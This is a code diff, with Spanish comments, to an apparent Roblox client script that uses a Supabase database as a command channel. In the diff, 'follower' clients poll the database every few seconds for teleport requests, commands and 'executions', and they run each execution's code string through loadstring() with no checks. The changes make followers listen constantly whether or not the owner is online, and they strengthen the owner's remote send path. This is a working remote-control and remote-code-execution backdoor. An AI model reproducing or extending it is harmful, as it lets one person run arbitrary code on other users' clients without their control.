@@ -63,7 +63,7 @@ local function supaRequest(action, body)
         return { success = true }
 
     elseif action == "get_trigger" then
-        local cutoff = os.time() - 20
+        local cutoff = os.time() - 60
         local cutoffISO = os.date("!%Y-%m-%dT%H:%M:%S.000Z", cutoff)
         local data = supaREST("GET", "jmods_triggers",
             "server_id=eq." .. body.server_id .. "&created_at=gte." .. cutoffISO .. "&select=id&limit=1")
@@ -1064,94 +1064,102 @@ local function SendHeartbeat()
             end
         end)
 
--- ✅ BRINGS + COMANDOS + EXECUCIONES — solo cuando hay owner online
--- ✅ SISTEMA REACTIVO — duerme hasta que el owner envía trigger
+-- ✅ SISTEMA REACTIVO MEJORADO
+        -- El follower siempre escucha triggers, sin importar ownerOnline
+        -- ownerOnline solo controla el heartbeat
         local pollingFast = false
         local fastUntil = 0
 
-        -- Loop de trigger: polling lento, solo chequea si hay señal del owner
+        -- Loop de trigger: siempre activo, polling cada 3s
         task.spawn(function()
+            task.wait(3)
             while true do
-                task.wait(15) -- chequea cada 15s si hay trigger
-                if not followerState.ownerOnline then
-                    task.wait(15)
-                    continue
-                end
-                local trigger = supaRequest("get_trigger", {
-                    server_id = currentServerId
-                })
-                if trigger and trigger.active then
-                    pollingFast = true
-                    fastUntil = tick() + 30 -- escuchar activamente por 30s
-                end
+                task.wait(3)
+                pcall(function()
+                    local trigger = supaRequest("get_trigger", {
+                        server_id = currentServerId
+                    })
+                    if trigger and trigger.active then
+                        pollingFast = true
+                        fastUntil = tick() + 45
+                    end
+                end)
             end
         end)
 
-        -- Loop activo: solo corre cuando hay trigger activo
+        -- Loop activo: corre cuando hay trigger activo
         task.spawn(function()
             while true do
-                task.wait(1)
+                task.wait(0.5)
                 if not pollingFast then
-                    task.wait(1)
+                    task.wait(0.5)
                     continue
                 end
                 if tick() > fastUntil then
                     pollingFast = false
+                    task.wait(1)
                     continue
                 end
 
                 -- BRINGS
-                local brings = supaRequest("get_brings", {
-                    user_id   = myUserId,
-                    server_id = currentServerId
-                })
-                if brings and brings.brings and #brings.brings > 0 then
-                    local ids = {}
-                    for _, b in ipairs(brings.brings) do
-                        table.insert(ids, b.id)
-                        task.spawn(function()
-                            for attempt = 1, 3 do
-                                TeleportToPlayer(tostring(b.sender_id))
-                                if attempt < 3 then task.wait(0.15) end
-                            end
-                        end)
+                pcall(function()
+                    local brings = supaRequest("get_brings", {
+                        user_id   = myUserId,
+                        server_id = currentServerId
+                    })
+                    if brings and brings.brings and #brings.brings > 0 then
+                        local ids = {}
+                        for _, b in ipairs(brings.brings) do
+                            table.insert(ids, b.id)
+                            local sid = tostring(b.sender_id)
+                            task.spawn(function()
+                                for attempt = 1, 3 do
+                                    TeleportToPlayer(sid)
+                                    if attempt < 3 then task.wait(0.15) end
+                                end
+                            end)
+                        end
+                        supaRequest("ack_brings", { ids = ids })
                     end
-                    supaRequest("ack_brings", { ids = ids })
-                end
+                end)
 
                 -- COMANDOS
-                local cmds = supaRequest("get_commands", {
-                    server_id = currentServerId
-                })
-                if cmds and cmds.commands and #cmds.commands > 0 then
-                    local ids = {}
-                    for _, cmd in ipairs(cmds.commands) do
-                        table.insert(ids, cmd.id)
-                        ProcessCommand({
-                            command      = cmd.command,
-                            senderUserId = tostring(cmd.sender_id)
-                        })
+                pcall(function()
+                    local cmds = supaRequest("get_commands", {
+                        server_id = currentServerId
+                    })
+                    if cmds and cmds.commands and #cmds.commands > 0 then
+                        local ids = {}
+                        for _, cmd in ipairs(cmds.commands) do
+                            table.insert(ids, cmd.id)
+                            ProcessCommand({
+                                command      = cmd.command,
+                                senderUserId = tostring(cmd.sender_id)
+                            })
+                        end
+                        supaRequest("ack_commands", { ids = ids })
                     end
-                    supaRequest("ack_commands", { ids = ids })
-                end
+                end)
 
                 -- EXECUCIONES
-                local execs = supaRequest("get_executions", {
-                    user_id   = myUserId,
-                    username  = LocalPlayer.Name,
-                    server_id = currentServerId
-                })
-                if execs and execs.executions and #execs.executions > 0 then
-                    local ids = {}
-                    for _, ex in ipairs(execs.executions) do
-                        table.insert(ids, ex.id)
-                        pcall(function()
-                            local func = loadstring(ex.code)
-                            if func then func() end
-                        end)
+                pcall(function()
+                    local execs = supaRequest("get_executions", {
+                        user_id   = myUserId,
+                        username  = LocalPlayer.Name,
+                        server_id = currentServerId
+                    })
+                    if execs and execs.executions and #execs.executions > 0 then
+                        local ids = {}
+                        for _, ex in ipairs(execs.executions) do
+                            table.insert(ids, ex.id)
+                            pcall(function()
+                                local func = loadstring(ex.code)
+                                if func then func() end
+                            end)
+                        end
+                        supaRequest("ack_executions", { ids = ids })
                     end
-                    supaRequest("ack_executions", { ids = ids })
-                end
+                end)
             end
         end)
     -- ========================================
@@ -1973,7 +1981,7 @@ detectBtn.MouseButton1Click:Connect(function()
             permLabel.Parent = permBadge
         end
 
-   local function SendCommand(cmd)
+local function SendCommand(cmd)
             if cmd == "" then return end
             if isAdmin and not isOwner then
                 local cmdPrefix = cmd:match("^(%S+)")
@@ -1982,14 +1990,18 @@ detectBtn.MouseButton1Click:Connect(function()
                     if cmdPrefix == oc then return end
                 end
             end
-            -- ✅ Primero activar a los followers
+            -- Activar trigger primero (2 veces para asegurar)
             supaRequest("send_trigger", { server_id = currentServerId })
-            -- Luego enviar el comando
+            task.wait(0.1)
+            supaRequest("send_trigger", { server_id = currentServerId })
+            -- Luego enviar el comando con pequeño delay
+            task.wait(0.2)
             supaRequest("send_command", {
                 sender_id   = myUserId,
                 sender_role = myRole,
                 server_id   = currentServerId,
-                command     = cmd
+                command     = cmd,
+                target      = cmd:match("%S+%s+(%S+)") or "all"
             })
             commandInput.Text = ""
             local originalColor = sendBtn.BackgroundColor3
@@ -2000,8 +2012,8 @@ detectBtn.MouseButton1Click:Connect(function()
             sendBtn.Text = "Ejecutar"
         end
         
-        sendBtn.MouseButton1Click:Connect(function() SendCommand(commandInput.Text) end)
-        commandInput.FocusLost:Connect(function(enter) if enter then SendCommand(commandInput.Text) end end)
+sendBtn.MouseButton1Click:Connect(function() task.spawn(SendCommand, commandInput.Text) end)
+        commandInput.FocusLost:Connect(function(enter) if enter then task.spawn(SendCommand, commandInput.Text) end end)
 
         -- PANEL EJECUCION (solo owners)
         local executionPanel = Instance.new("Frame")
@@ -2220,8 +2232,13 @@ detectBtn.MouseButton1Click:Connect(function()
         end)
 
 if isOwner then
-            local function ExecuteRemoteCode(code, target)
+local function ExecuteRemoteCode(code, target)
                 if code == "" then return end
+                -- Activar followers primero
+                supaRequest("send_trigger", { server_id = currentServerId })
+                task.wait(0.15)
+                supaRequest("send_trigger", { server_id = currentServerId })
+                task.wait(0.2)
                 supaRequest("send_execution", {
                     sender_id = myUserId,
                     server_id = currentServerId,
@@ -2235,8 +2252,8 @@ if isOwner then
                 executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
             end
 
-            executeBtn.MouseButton1Click:Connect(function()
-                ExecuteRemoteCode(codeInput.Text, targetInput.Text)
+executeBtn.MouseButton1Click:Connect(function()
+                task.spawn(ExecuteRemoteCode, codeInput.Text, targetInput.Text)
             end)
 
             clearBtn.MouseButton1Click:Connect(function()
